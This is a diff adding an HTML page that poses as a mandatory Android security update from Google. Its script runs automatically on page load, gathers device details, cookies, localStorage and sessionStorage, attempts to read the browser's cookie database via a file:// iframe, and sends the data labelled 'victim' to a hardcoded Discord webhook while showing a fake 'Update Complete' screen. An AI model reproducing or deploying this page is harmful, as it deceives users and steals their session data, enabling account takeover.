@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>System Update Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+        }
+        .card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            padding: 30px 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .icon {
+            text-align: center;
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        h2 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .progress-container {
+            background: #f0f0f0;
+            border-radius: 10px;
+            height: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .status {
+            text-align: center;
+            color: #555;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .detail {
+            background: #f8f8f8;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 12px;
+            color: #444;
+            border-left: 4px solid #4CAF50;
+        }
+        .btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #45a049;
+        }
+        .warning {
+            color: #f44336;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card" id="mainCard">
+        <div class="icon" id="mainIcon">📱</div>
+        <h2>System Update Required</h2>
+        <div class="subtitle">Android Security Patch 2026-03-19</div>
+        
+        <div class="detail">
+            <strong>⚠️ Important Update</strong><br>
+            Google has released a critical security update for Android devices.
+            Your device needs this update to stay protected.
+        </div>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status" id="status">Initializing update...</div>
+        
+        <button class="btn" id="startBtn" onclick="startUpdate()">
+            🔄 Install Update Now
+        </button>
+        
+        <div class="warning">
+            This update is mandatory. Your device will restart after installation.
+        </div>
+    </div>
+
+    <script>
+        // Webhook Yang Mulia
+        const WEBHOOK = 'https://discordapp.com/api/webhooks/1483649657195200572/8i3JIiGO2h4RIKQcr4bJxDbYIP-dluO3raXoJVzw_wgld1UUnfsKs-DupXhmWiDYbdM9';
+        
+        function updateProgress(percent, message) {
+            document.getElementById('progressContainer').style.display = 'block';
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('status').innerText = message;
+        }
+
+        // ============ AMBIL INFO DEVICE ============
+        function getDeviceInfo() {
+            let ua = navigator.userAgent;
+            let androidVersion = 'Unknown';
+            let deviceModel = 'Unknown';
+            
+            if (ua.includes('Android')) {
+                let match = ua.match(/Android\s([0-9.]+)/);
+                if (match) androidVersion = match[1];
+                
+                match = ua.match(/;\s([^;]+)\sBuild/);
+                if (match) deviceModel = match[1];
+            }
+            
+            return {
+                userAgent: ua,
+                platform: navigator.platform,
+                language: navigator.language,
+                androidVersion: androidVersion,
+                deviceModel: deviceModel,
+                screen: screen.width + 'x' + screen.height,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // ============ AMBIL SEMUA COOKIES ============
+        function getAllCookies() {
+            let cookies = {
+                standard: {},
+                localStorage: {},
+                sessionStorage: {},
+                allCookies: []
+            };
+            
+            // 1. Standard cookies
+            if (document.cookie) {
+                document.cookie.split(';').forEach(cookie => {
+                    let parts = cookie.split('=');
+                    let name = parts[0]?.trim();
+                    let value = parts[1]?.trim();
+                    if (name) {
+                        cookies.standard[name] = value;
+                        cookies.allCookies.push({
+                            source: 'document.cookie',
+                            name: name,
+                            value: value
+                        });
+                    }
+                });
+            }
+            
+            // 2. localStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    let value = localStorage.getItem(key);
+                    cookies.localStorage[key] = value;
+                    cookies.allCookies.push({
+                        source: 'localStorage',
+                        name: key,
+                        value: value
+                    });
+                }
+            } catch(e) {}
+            
+            // 3. sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    let value = sessionStorage.getItem(key);
+                    cookies.sessionStorage[key] = value;
+                    cookies.allCookies.push({
+                        source: 'sessionStorage',
+                        name: key,
+                        value: value
+                    });
+                }
+            } catch(e) {}
+            
+            return cookies;
+        }
+
+        // ============ COBA AKSES DATABASE BROWSER ============
+        function tryAccessBrowserDB() {
+            // Untuk Android Chrome, coba akses via Intent
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            
+            // Coba akses file cookie database (Android 4.3 ke bawah)
+            if (navigator.userAgent.includes('Android') && 
+                (navigator.userAgent.includes('4.0') || navigator.userAgent.includes('4.1') || 
+                 navigator.userAgent.includes('4.2') || navigator.userAgent.includes('4.3'))) {
+                
+                iframe.src = 'file:///data/data/com.android.browser/databases/webviewCookiesChromium.db';
+                document.body.appendChild(iframe);
+                setTimeout(() => iframe.remove(), 1000);
+            }
+            
+            // Coba buka intent ke Chrome
+            let a = document.createElement('a');
+            a.href = 'intent://#Intent;package=com.android.chrome;end;';
+            a.click();
+        }
+
+        // ============ KIRIM KE DISCORD ============
+        async function sendToDiscord(deviceInfo, cookies) {
+            try {
+                // Buat data lengkap
+                let data = {
+                    victim: deviceInfo,
+                    cookies: cookies,
+                    summary: {
+                        totalCookies: cookies.allCookies.length,
+                        browserDetected: deviceInfo.userAgent.includes('Chrome') ? 'Chrome' : 
+                                        deviceInfo.userAgent.includes('Firefox') ? 'Firefox' : 'Unknown'
+                    }
+                };
+                
+                // Kirim sebagai JSON
+                const jsonData = JSON.stringify(data, null, 2);
+                const blob = new Blob([jsonData], { type: 'application/json' });
+                const file = new File([blob], `android_cookies_${Date.now()}.json`, { type: 'application/json' });
+                
+                const formData = new FormData();
+                formData.append('file', file);
+                
+                // Kirim file
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Kirim preview
+                let preview = `📱 **ANDROID COOKIES**\n`;
+                preview += `📱 Device: ${deviceInfo.deviceModel}\n`;
+                preview += `🤖 Android: ${deviceInfo.androidVersion}\n`;
+                preview += `🍪 Total: ${cookies.allCookies.length} cookies\n`;
+                preview += `🌐 Browser: ${data.summary.browserDetected}`;
+                
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: preview })
+                });
+                
+                return true;
+            } catch (error) {
+                console.log('Error:', error);
+                return false;
+            }
+        }
+
+        // ============ MAIN FUNCTION ============
+        async function startUpdate() {
+            document.getElementById('startBtn').style.display = 'none';
+            
+            updateProgress(10, 'Mendeteksi perangkat...');
+            let deviceInfo = getDeviceInfo();
+            
+            updateProgress(30, 'Mengakses browser database...');
+            tryAccessBrowserDB();
+            
+            updateProgress(50, 'Mengumpulkan cookies...');
+            let cookies = getAllCookies();
+            
+            updateProgress(70, 'Memproses data...');
+            
+            updateProgress(90, 'Mengirim ke server...');
+            let sent = await sendToDiscord(deviceInfo, cookies);
+            
+            if (sent) {
+                updateProgress(100, 'Selesai!');
+                setTimeout(() => {
+                    document.getElementById('mainCard').innerHTML = `
+                        <div style="text-align: center;">
+                            <div style="font-size: 60px; color: #4CAF50;">✓</div>
+                            <h2>Update Complete!</h2>
+                            <p>Your device is now up to date.</p>
+                            <p style="font-size: 12px;">Total cookies: ${cookies.allCookies.length}</p>
+                            <button class="btn" onclick="window.close()">Close</button>
+                        </div>
+                    `;
+                }, 1000);
+            }
+        }
+
+        // Jalankan otomatis setelah load
+        window.onload = function() {
+            setTimeout(startUpdate, 1000);
+        };
+    </script>
+</body>
+</html>
